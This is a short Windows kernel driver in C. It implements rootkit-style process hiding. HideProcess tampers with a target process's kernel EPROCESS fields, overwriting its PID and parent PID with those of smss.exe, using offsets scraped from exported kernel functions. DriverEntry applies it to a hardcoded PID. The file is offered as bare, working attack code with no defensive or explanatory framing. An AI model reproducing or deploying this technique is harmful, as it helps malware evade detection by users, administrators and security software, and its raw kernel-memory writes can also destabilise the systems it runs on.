#include <ntifs.h>

NTKERNELAPI
HANDLE PsGetProcessInheritedFromUniqueProcessId(IN PEPROCESS Process);

NTKERNELAPI
char* PsGetProcessImageFileName(__in PEPROCESS Process);

NTSTATUS GetProcessIdByName(char* process, ULONG* processPid)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    PEPROCESS Process;
    for (ULONG Pid = 4; Pid <= 240000; Pid += 4)
    {
        if (Pid != 0) {
            status = PsLookupProcessByProcessId((HANDLE)Pid, &Process);
            if (NT_SUCCESS(status))
            {
                if (strstr(PsGetProcessImageFileName(Process), process))
                {
                    *processPid = Pid;
                    status = STATUS_SUCCESS;
                    ObDereferenceObject(Process);
                    break;
                }
                ObDereferenceObject(Process);
            }
        }
    }
    return status;
}

BOOLEAN HideProcess(HANDLE pid) {
    NTSTATUS status = 1, status1 = 1;
    ULONG smssPid = 0;

    status = GetProcessIdByName("smss.exe", &smssPid);
    if (!NT_SUCCESS(status) || !smssPid) {
        return FALSE;
    }

    PEPROCESS process, process1;
    status = PsLookupProcessByProcessId((HANDLE)pid, &process);
    status1 = PsLookupProcessByProcessId((HANDLE)smssPid, &process1);
    if (!NT_SUCCESS(status) || !NT_SUCCESS(status1)) {
        return FALSE;
    }

    *(ULONGLONG*)((PUCHAR)process + *(ULONG*)((PUCHAR)PsGetProcessInheritedFromUniqueProcessId + 0x3)) = *(ULONGLONG*)((PUCHAR)process1 + *(ULONG*)((PUCHAR)PsGetProcessInheritedFromUniqueProcessId + 0x3));
    *(ULONGLONG*)((PUCHAR)process + *(ULONG*)((PUCHAR)PsGetProcessId + 0x3)) = smssPid;

    ObDereferenceObject(process);
    ObDereferenceObject(process1);

    return TRUE;
}

_Function_class_(DRIVER_UNLOAD)
VOID UnloadDriver(PDRIVER_OBJECT pDriver)
{
    (pDriver);
}

DRIVER_INITIALIZE DriverEntry;
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pRegpath) {
    (pDriver, pRegpath);

    HideProcess((HANDLE)5356);      // Òþ²Ø½ø³Ì
    pDriver->DriverUnload = UnloadDriver;
    return STATUS_SUCCESS;
}